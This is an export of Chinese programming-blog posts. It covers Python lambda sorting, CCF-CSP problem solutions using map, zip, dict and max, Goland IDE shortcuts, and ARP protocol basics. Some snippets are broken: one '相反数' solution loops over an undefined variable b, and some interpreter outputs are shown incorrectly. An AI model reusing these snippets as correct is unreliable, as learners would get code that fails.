<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>L = [(<span class="string">'fzy'</span>, <span class="number">23</span>), (<span class="string">'zxc'</span>, <span class="number">22</span>), (<span class="string">'qwe'</span>, <span class="number">18</span>)]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L.sort(key=<span class="keyword">lambda</span> k:k[<span class="number">1</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(L)</div><div class="line">[(<span class="string">'qwe'</span>, <span class="number">18</span>), (<span class="string">'zxc'</span>, <span class="number">22</span>), (<span class="string">'fzy'</span>, <span class="number">23</span>)]</div></pre></td></tr></table></figure>
<p>　　使用 <code>lambda</code> ，按照 <code>key</code> 排序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>L = [(<span class="string">'fzy'</span>, <span class="number">23</span>), (<span class="string">'zxc'</span>, <span class="number">22</span>), (<span class="string">'qwe'</span>, <span class="number">18</span>)]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L.sort(key=<span class="keyword">lambda</span> k:k[<span class="number">0</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(L)</div><div class="line">[(<span class="string">'fzy'</span>, <span class="number">23</span>), (<span class="string">'qwe'</span>, <span class="number">18</span>), (<span class="string">'zxc'</span>, <span class="number">22</span>)]</div></pre></td></tr></table></figure>
<p>　　使用 <code>lambda</code> ，先按 <code>key</code> 后按 <code>value</code> 排序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>L = [(<span class="string">'fzy'</span>, <span class="number">23</span>), (<span class="string">'zxc'</span>, <span class="number">22</span>), (<span class="string">'qwe'</span>, <span class="number">18</span>)]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L.sort(key=<span class="keyword">lambda</span> k:(k[<span class="number">0</span>], k[<span class="number">1</span>]))</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(L)</div><div class="line">[(<span class="string">'fzy'</span>, <span class="number">23</span>), (<span class="string">'qwe'</span>, <span class="number">18</span>), (<span class="string">'zxc'</span>, <span class="number">22</span>)]</div></pre></td></tr></table></figure>
<p>　　<code>lambda</code> 函数：</p>
<ul>
<li><code>lambda</code> 函数是匿名的：所谓匿名函数，通俗地说就是没有名字的函数。</li>
<li><code>lambda</code> 函数有输入和输出：输入是传入到参数列表的值，输出是根据表达式计算得到的值。</li>
<li><code>lambda</code> 函数一般功能简单：单行表达式决定了 <code>lambda</code> 函数不可能完成复杂的逻辑，只能完成非常简单的功能。由于其实现的功能一目了然，甚至不需要专门的名字来说明。</li>
</ul>
<p>　　使用示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">lambda</span> x, y: x*y；函数输入是x和y，输出是它们的积x*y</div><div class="line"><span class="keyword">lambda</span> *args: sum(args); 输入是任意个数的参数，输出是它们的和</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 相反数</title>
    <url>/2018/09/18/CCF-CSP-%E7%9B%B8%E5%8F%8D%E6%95%B0/</url>
    <content><![CDATA[<center>CCF-CSP 201403-1 相反数 题解</center>

<a id="more"></a>
<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201403-1</div><div class="line">试题名称：相反数</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    有 N 个非零且各不相同的整数。请你编一个程序求出它们中有多少对相反数(a 和 -a 为一对相反数)。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    第一行包含一个正整数 N。(1 ≤ N ≤ 500)。</div><div class="line">    第二行为 N 个用单个空格隔开的非零整数,每个数的绝对值不超过1000,保证这些整数各不相同。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    只输出一个整数,即这 N 个数中包含多少对相反数。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    5</div><div class="line">    1 2 3 -1 -2</div><div class="line"></div><div class="line">样例输出</div><div class="line">    2</div></pre></td></tr></table></figure>
<h4 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h4><p>　　从第一个数开始，依次向后扫描，每次将该数与其之后的数相加，检查和是不是 0，如果是则是相反数，否则不是。此外，要排除数字 0 的情况。样例演示如下：</p>
<p>　　1+2，1+3，1+(-1)，1+(-2) 判断和是否为0</p>
<p>　　2+3，2+(-1)，2+(-2) 判断和是否为0</p>
<p>　　……依此类推</p>
<p>　　Python 代码实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 获取整数个数的输入</span></div><div class="line">a = list(map(int, input().split()))  <span class="comment"># 获取输入的n个整数</span></div><div class="line">count = <span class="number">0</span>  <span class="comment"># 计数</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>):  <span class="comment"># 按顺序扫描</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, n):</div><div class="line">        <span class="keyword">if</span> a[i] != <span class="number">0</span> <span class="keyword">and</span> (a[i] + a[j] == <span class="number">0</span>):  <span class="comment"># 判断是否是相反数</span></div><div class="line">            count = count + <span class="number">1</span></div><div class="line">print(count)  <span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
<h4 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h4><p>　　利用集合中元素不同的性质，将原列表中的负数转换成正数，将新的列表转换成集合，然后用输入的整数个数（原列表长度）减去集合的长度（去除相反数的列表长度）即为相反数的个数。</p>
<p>　　Python 代码实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 获取整数个数的输入</span></div><div class="line">a = list(map(int, input().split()))  <span class="comment"># 获取输入的n个整数</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(b):</div><div class="line">    a[x] = abs(a[x])  <span class="comment"># 负数转正数</span></div><div class="line">c = set(a)  <span class="comment"># 列表转换成集合</span></div><div class="line">print(n - len(c))  <span class="comment"># 得到相反数个数</span></div></pre></td></tr></table></figure>
<h4 id="题解3"><a href="#题解3" class="headerlink" title="题解3"></a>题解3</h4><p>　　题解 2 的另一种间接写法，充分利用了 <code>map()</code> 函数。Python 代码实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())</div><div class="line">a = list(map(int, input().split()))  <span class="comment"># 输入转化为列表</span></div><div class="line">b = set(map(abs, a))  <span class="comment"># 各项取绝对值后转化为集合，即除去相反的负数</span></div><div class="line">print(n - len(b))  <span class="comment"># 原长度减去现长度，即被减去的相反数个数</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 出现次数最多的数</title>
    <url>/2018/09/17/CCF-CSP-%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E6%9C%80%E5%A4%9A%E7%9A%84%E6%95%B0/</url>
    <content><![CDATA[<center>CCF-CSP 201312-1 出现次数最多的数 题解</center>

<a id="more"></a>
<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201312-1</div><div class="line">试题名称：出现次数最多的数</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述：</div><div class="line">    给定n个正整数，找出它们中出现次数最多的数。如果这样的数有多个，请输出其中最小的一个。</div><div class="line"></div><div class="line">输入格式　　</div><div class="line">    输入的第一行只有一个正整数n(1 ≤ n ≤ 1000)，表示数字的个数。 　　</div><div class="line">    输入的第二行有n个整数s1, s2, …, sn (1 ≤ si ≤ 10000, 1 ≤ i ≤ n)。相邻的数用空格分隔。</div><div class="line"></div><div class="line">输出格式　　</div><div class="line">    输出这n个次数中出现次数最多的数。如果这样的数有多个，输出其中最小的一个。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    6</div><div class="line">    10 1 10 20 30 20</div><div class="line"></div><div class="line">样例输出</div><div class="line">    10</div></pre></td></tr></table></figure>
<h4 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h4><p>　　最容易想到的办法就是用数组来记录整数的出现次数，比如整数10出现的次数，用索引（下标）为10的数组元素a[10]来记录，出现 1 次 a[10] 的值即加 1，20则用a[20]来记录，依此类推。当然，这个数组的大小必须满足题目的最大要求，整数小于等于10000，也就是说数组必须要大于10000个元素，才能保证所有测试样例全部通过。完成记录以后，遍历整个记录数组，找出数组中最大的元素，记录其索引值（下标），当出现出现次数相等的情况时，选择较小的下标作为结果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 读取输入整数个数</span></div><div class="line">a = list(map(int, input().split()))  <span class="comment"># 读取输入的整数，并存储在列表里</span></div><div class="line">b = [<span class="number">0</span>] * <span class="number">10004</span>  <span class="comment"># 标记整数出现次数的数组</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:  <span class="comment"># 遍历输入的整数列表</span></div><div class="line">    b[i] = b[i] + <span class="number">1</span>  <span class="comment"># 标记整数出现次数</span></div><div class="line">m = <span class="number">0</span></div><div class="line">result = <span class="number">0</span>  <span class="comment"># 结果</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10004</span>):  <span class="comment"># 遍历整个计数数组</span></div><div class="line">    <span class="keyword">if</span> (b[i] &gt; m) <span class="keyword">or</span> (b[i] == m <span class="keyword">and</span> result &gt; i):  <span class="comment"># 记录出现次数最多，且最小的整数</span></div><div class="line">        m = b[i]  <span class="comment"># 当前最大次数记录更新</span></div><div class="line">        result = i  <span class="comment"># 记录当前最大次数的索引，即我们的结果</span></div><div class="line"></div><div class="line">print(result)  <span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
<h4 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h4><p>　　改进第一种方法中的一个细节，就是关于出现次数相等情况的处理，由于最后是按从小到大的顺利遍历数组，所以不需要处理相等的情况也可以保证选出的出现次数的最多的同时也是最小的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 读取输入整数个数</span></div><div class="line">a = list(map(int, input().split()))  <span class="comment"># 读取输入的整数，并存储在列表里</span></div><div class="line">b = [<span class="number">0</span>] * <span class="number">10004</span>  <span class="comment"># 标记整数出现次数的数组</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:  <span class="comment"># 遍历输入的整数列表</span></div><div class="line">    b[i] = b[i] + <span class="number">1</span>  <span class="comment"># 标记整数出现次数</span></div><div class="line">m = <span class="number">0</span></div><div class="line">result = <span class="number">0</span>  <span class="comment"># 结果</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10004</span>):  <span class="comment"># 遍历整个计数数组</span></div><div class="line">    <span class="keyword">if</span> b[i] &gt; m:  <span class="comment"># 记录出现次数最多，由于是按从小到大的顺利遍历数组，所以不需要处理相等的情况</span></div><div class="line">        m = b[i]  <span class="comment"># 当前最大次数记录更新</span></div><div class="line">        result = i  <span class="comment"># 记录当前最大次数的索引，即我们的结果</span></div><div class="line"></div><div class="line">print(result)  <span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
<h4 id="题解3"><a href="#题解3" class="headerlink" title="题解3"></a>题解3</h4><p>　　这份代码确实比较分骚，充分利用了Python的内建函数来结题，在列表、元组和字典之间进行流畅地转换：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())</div><div class="line">a = list(map(int, input().split()))</div><div class="line">b = list(set(a))  <span class="comment"># 利用集合的特性，转换为集合，去掉其中相同数</span></div><div class="line">b.sort()  <span class="comment"># 从小到大排序</span></div><div class="line">s = dict(zip(b, map(a.count, b)))  <span class="comment"># 将数与它的出现次数组合再转为字典</span></div><div class="line">print(max(s, key=s.get))  <span class="comment"># 根据字典值选出count最大的数</span></div></pre></td></tr></table></figure>
<h4 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h4><h5 id="map-函数"><a href="#map-函数" class="headerlink" title="map() 函数"></a>map() 函数</h5><p>　　Python函数编程中的 <code>map()</code> 函数是将 <code>func</code> 作用于 <code>seq</code> 中的每一个元素，并将所有的调用的结果作为一个 <code>list</code> 返回。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">map(func, seq1[, seq2,…])</div></pre></td></tr></table></figure>
<p>　　第一个参数接受一个函数名，后面的参数接受一个或多个可迭代的序列，返回的是一个集合。 </p>
<p>　　Python2 中：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>nums = map(int, input().split())</div><div class="line"><span class="number">19</span> <span class="number">7</span> <span class="number">8</span> <span class="number">25</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>nums</div><div class="line">[<span class="number">19</span> <span class="number">7</span> <span class="number">8</span> <span class="number">25</span>]</div></pre></td></tr></table></figure>
<p>　　Python3中：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>nums = map(int, input().split())</div><div class="line"><span class="number">19</span> <span class="number">7</span> <span class="number">8</span> <span class="number">25</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>nums</div><div class="line">&lt;map object at <span class="number">0x035A18F0</span>&gt;</div></pre></td></tr></table></figure>
<p>　　如果也想实现python2的效果，需要这样写：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>list(nums)</div><div class="line">[<span class="number">19</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">25</span>]</div></pre></td></tr></table></figure>
<p>　　在上面的题解3中，使用 <code>map()函数</code>结合 <code>list.count()</code> 函数做统计：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">10</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">20</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">1</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list(map(a.count, b))</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</div></pre></td></tr></table></figure>
<h5 id="zip-函数"><a href="#zip-函数" class="headerlink" title="zip() 函数"></a>zip() 函数</h5><p>　　<code>zip()</code> 函数用于将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的列表。如果各个迭代器的元素个数不一致，则返回列表长度与最短的对象相同，利用 * 号操作符，可以将元组解压为列表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = zip(a,b)</div><div class="line">[(<span class="number">1</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">5</span>), (<span class="number">3</span>, <span class="number">6</span>)]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>zip(*c)</div><div class="line">[(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), (<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)]</div></pre></td></tr></table></figure>
<p>　　在上面的题解3中，使用 <code>zip()函数</code>将整数及其出现次数整合成元组：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">10</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">20</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">1</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list(zip(b, map(a.count, b)))</div><div class="line">[(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">10</span>, <span class="number">2</span>), (<span class="number">20</span>, <span class="number">2</span>), (<span class="number">30</span>, <span class="number">1</span>)]</div></pre></td></tr></table></figure>
<h5 id="dict-函数"><a href="#dict-函数" class="headerlink" title="dict() 函数"></a>dict() 函数</h5><p>　　<code>dict()</code> 函数用于创建一个字典。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">dict(key/value)</div></pre></td></tr></table></figure>
<p>　　<code>key/value</code> – 用于创建字典的键/值对，可以为空、字典、关键字、包含元组的列表等，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dict()	<span class="comment"># 空字典</span></div><div class="line">&#123;&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dict(&#123;<span class="string">'fzy'</span>: <span class="number">23</span>&#125;)	<span class="comment"># 传递字典</span></div><div class="line">&#123;<span class="string">'fzy'</span>: <span class="number">23</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dict(fzy=<span class="number">23</span>)	<span class="comment"># 传递关键字</span></div><div class="line">&#123;<span class="string">'fzy'</span>: <span class="number">23</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dict([(<span class="string">'fzy'</span>, <span class="number">23</span>),(<span class="string">'xsc'</span>, <span class="number">22</span>)])	<span class="comment"># 传递包含多个元组的列表</span></div><div class="line">&#123;<span class="string">'fzy'</span>: <span class="number">23</span>, <span class="string">'xsc'</span>: <span class="number">22</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dict(zip([<span class="string">'fzy'</span>, <span class="string">'xsc'</span>], [<span class="number">23</span>, <span class="number">22</span>]))	<span class="comment"># 传递zip()函数</span></div><div class="line">&#123;<span class="string">'fzy'</span>: <span class="number">23</span>, <span class="string">'xsc'</span>: <span class="number">22</span>&#125;</div></pre></td></tr></table></figure>
<p>　　在上面的题解3中，使用 <code>dict()函数</code>将由整数及其出现次数组成的元组转换成字典：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">10</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">20</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">1</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dict(zip(b, map(a.count, b)))</div><div class="line">&#123;<span class="number">1</span>: <span class="number">1</span>, <span class="number">10</span>: <span class="number">2</span>, <span class="number">20</span>: <span class="number">2</span>, <span class="number">30</span>: <span class="number">1</span>&#125;</div></pre></td></tr></table></figure>
<h5 id="max-函数"><a href="#max-函数" class="headerlink" title="max() 函数"></a>max() 函数</h5><p>　　<code>max()</code> 函数返回给定参数的最大值，参数可以为序列。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt;&gt;&gt; max([1, 2, 3])</div><div class="line">3</div></pre></td></tr></table></figure>
<p>　　可以用 <code>max(dict,key=dict.get)</code> 方法获得字典 <code>dict</code> 中 <code>value</code> 的最大值所对应的键的方法，<code>max(dict, key)</code> 方法首先遍历迭代器，并将返回值作为参数传递给 <code>key</code> 对应的函数，然后将函数的执行结果传给 <code>key</code> ，并以此时 <code>key</code> 值为标准进行大小判断，返回最大值。</p>
<p>　　在上面的题解3中，使用 <code>max()函数</code> 得到由整数及其出现次数组成的字典中出现次数最大的整数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">10</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">20</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="number">1</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = dict(zip(b, map(a.count, b)))</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s</div><div class="line">&#123;<span class="number">1</span>: <span class="number">1</span>, <span class="number">10</span>: <span class="number">2</span>, <span class="number">20</span>: <span class="number">2</span>, <span class="number">30</span>: <span class="number">1</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>max(s, key=s.get)</div><div class="line"><span class="number">10</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Goland IDE 常用快捷键</title>
    <url>/2018/09/15/Goland%20IDE%20%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[<center>Goland IDE 常用快捷键总结。</center>

<a id="more"></a>
<h4 id="代码编辑"><a href="#代码编辑" class="headerlink" title="代码编辑"></a>代码编辑</h4><ul>
<li>CTRL+X，剪切、删除当前光标所在行。</li>
<li>CTRL+D，复制当前光标所在行。</li>
<li>ALT+Q，查看当前方法的声明。</li>
<li>CTRL+P， 方法参数提示 。</li>
<li>CTRL+空格， 代码提示 。</li>
<li>Ctrl+Shift+Up/Down， 代码向上/下移动。 </li>
<li>CTRL+Backspace，按单词进行删除。</li>
<li>SHIFT+ENTER，向下插入新行，即使光标在当前行的中间。</li>
<li>ALT+SHIFT+UP/DOWN，将光标所在行的代码上下移动。</li>
<li>CTRL+SHIFT+U，将选中内容进行大小写转化。</li>
</ul>
<h4 id="代码格式化"><a href="#代码格式化" class="headerlink" title="代码格式化"></a>代码格式化</h4><ul>
<li>CTRL+ALT+T，把代码包在一个块内，例如if{…}else{…}。</li>
<li>CTRL+ALT+L，格式化代码。</li>
<li>CTRL+空格，代码提示。</li>
<li>CTRL+/，单行注释。</li>
<li>CTRL+SHIFT+/，进行多行注释。</li>
<li>CTRL+B，快速打开光标处的结构体或方法（跳转到定义处）。</li>
<li>CTRL+“+/-”，可以将当前方法进行展开或折叠。</li>
</ul>
<h4 id="查找和定位"><a href="#查找和定位" class="headerlink" title="查找和定位"></a>查找和定位</h4><ul>
<li>CTRL+R，替换文本。</li>
<li>CTRL+F，查找文本。</li>
<li>CTRL+SHIFT+F，进行全局查找。</li>
<li>CTRL+G，快速定位到某行。</li>
<li>CTRL+N，查找类 。</li>
<li>CTRL+F，在当前窗口查找文本 。</li>
<li>CTRL+SHIFT+F，在指定窗口查找文本 。</li>
<li>CTRL+R，在当前窗口替换文本 。</li>
<li>CTRL+SHIFT+R，在指定窗口替换文本 。</li>
</ul>
<h4 id="文件相关快捷键"><a href="#文件相关快捷键" class="headerlink" title="文件相关快捷键"></a>文件相关快捷键</h4><ul>
<li>CTRL+E，打开最近浏览过的文件。</li>
<li>CTRL+SHIFT+E，打开最近更改的文件。</li>
<li>CTRL+N，可以快速打开struct结构体。</li>
<li>CTRL+SHIFT+N，可以快速打开文件。</li>
</ul>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>ARP：地址解析协议</title>
    <url>/2018/09/13/ARP%EF%BC%9A%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<center>地址解析协议 ARP 的原理、攻击与防御学习总结。</center>

<a id="more"></a>
<p><br></p>
<p>　　在网络通信中，主机和主机通信的数据包需要依据 OSI 模型从上到下进行数据封装，当数据封装完整后，再向外发出。在网络层上，主机和路由器用逻辑地址来标志，逻辑地址在本地是唯一的，但在全局上不一定。在TCP/IP 协议族中称为 IP 地址，现在常用的版本是 IPv4，长度是 32 位。在链路层上，主机和路由器用他们的物理地址来标志，即 48 位的物理地址，也是是我们通常所说的网卡地址（MAC地址）。</p>
<p>　　因此，需要能够将逻辑地址和相应的物理地址之间进行映射，完成这样的映射可以使用静态映射和动态映射：</p>
<ul>
<li>静态映射：创建一个表，存储逻辑地址和物理地址之间的关联关系，然后将网络上的每个主机都存储这张表。缺点是，映射表必须周期的更新，增加了网络的开销。</li>
<li>动态映射：采用 ARP（Address Resolution Protocol，地址解析协议），它负责完成逻辑地址向物理地址的动态映射，将 32 位逻辑地址（IP地址）转换为 48 位的物理地址（MAC地址）。</li>
</ul>
<h4 id="ARP-基本原理"><a href="#ARP-基本原理" class="headerlink" title="ARP 基本原理"></a>ARP 基本原理</h4><p>　　ARP 通过一个查找表（ARP缓存）来执行地址转换的。当在 ARP 缓存中没有找到地址时，则向网络发送一个广播请求，网络上所有的主机和路由器都接收和处理这个 ARP 请求，但是只有相同 IP 地址的接收到广播请求的主机或路由器，发回一个 ARP 应答分组，应答中包含它的 IP 地址和物理地址，并保存在请求主机的 ARP 缓存中。其他主机或路由器都丢弃此分组。</p>
<p>　　具体过程如下：</p>
<ol>
<li>本地主机在局域网中广播 ARP 请求，ARP 请求数据帧中包含目的主机的 IP 地址，意思是“如果你是这个 IP 地址的拥有者，请回答你的硬件地址”。</li>
<li>目的主机的 ARP 层解析这份广播报文，识别出是询问其硬件地址。于是发送 ARP 应答包，里面包含 IP 地址及其对应的硬件地址。</li>
<li>本地主机收到 ARP 应答后，知道了目的地址的硬件地址，之后的数据报就可以传送了。</li>
</ol>
<p>　　注意：点对点链路不使用 ARP 协议。APR 请求包是广播的，但是 ARP 应答帧是单播的。</p>
<h4 id="ARP-高速缓存"><a href="#ARP-高速缓存" class="headerlink" title="ARP 高速缓存"></a>ARP 高速缓存</h4><p>　　ARP 高效运行的关键是由于每个主机上都有一个 ARP 高速缓存。这个高速缓存存放了最近 Internet 地址到硬件地址之间的映射记录。高速缓存中每一项的生存时间一般为20分钟，起始时间从被创建时开始算起。</p>
<p>　　常用 ARP 高速缓存操作命令：</p>
<ul>
<li>缓存查看</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> arp -a	<span class="comment"># 参数-a的意思是显示高速缓存中所有的内容。</span></span></div></pre></td></tr></table></figure>
<ul>
<li>缓存清空</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> arp -d</span></div></pre></td></tr></table></figure>
<h4 id="代理-ARP"><a href="#代理-ARP" class="headerlink" title="代理 ARP"></a>代理 ARP</h4><p>　　如果 ARP 请求是从一个网络的主机发往另一个网络上的主机，可能需要经过很多路由器，而路由器隔离广播域，每个接口/网段都是独立的广播域， ARP 请求又是二层广播包，所以 ARP 广播包没法通过过路由器。。因此，网关设备收到此 ARP 请求，会用自己的 MAC 地址返回给请求者，这便是代理 ARP（Proxy ARP）。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/9/13-1.png" alt=""></p>
<p>　　上图中，PC 发送 ARP 请求服务器 8.8.8.8 的 MAC 地址，路由器（网关）收到这个请求时会进行判断，由于目标 8.8.8.8 不属于本网段（即跨网段），此时便返回自己的接口 MAC 地址给 PC，后续电脑访问服务器时，目标 MAC 直接封装为 MAC254。</p>
<p>　　实际网络中，无论是同网段还是跨网段通信（例如访问互联网），绝大情况下都是使用正常的 ARP，而不是代理ARP。</p>
<ul>
<li>代理 ARP 仅仅是正常ARP的一个拓展使用，是可选项而不是必要项；</li>
<li>代理 ARP 有特定的应用场景，与网关/路由的设置有直接关系：当电脑没有网关/路由功能时，并且需要跨网站通信时，则会触发代理 ARP 。换句话说，如果有网关/路由功能，则不需要代理 ARP；</li>
<li>正常环境下，当用户接入网络时，都会通过 DHCP 协议或手工配置的方式得到 IP 和网关信息（所以不需要代理ARP）。</li>
</ul>
<p>　　那么什么时候使用正常 ARP ？什么时候使用代理 ARP 呢？总结如下：</p>
<ul>
<li>电脑没有网关时，ARP 直接询问目标 IP 对应的 MAC 地址（跨网段），采用代理 ARP；</li>
<li>电脑有网关时，ARP 只需询问网关 IP 对应的 MAC 地址（同网段），采用正常 ARP；</li>
<li>无论是正常 ARP 还是代理 ARP，电脑最终都拿到同一个目标 MAC 地址：网关 MAC。</li>
</ul>
<h4 id="免费-ARP"><a href="#免费-ARP" class="headerlink" title="免费 ARP"></a>免费 ARP</h4><p>　　免费 ARP 是指主机发送 ARP 查找自己的 IP 地址，用于检测局域网内的IP地址冲突。免费 ARP 可以有两个方面的作用：</p>
<ul>
<li>一个主机可以通过它来确定另一个主机是否设置了相同的 IP 地址。</li>
<li>如果发送免费 ARP 的主机正好改变了硬件地址（很可能是主机关机了，并换了一块接口卡，然后重新启动），那么这个分组就可以使其他主机高速缓存中旧的硬件地址进行相应的更新。</li>
</ul>
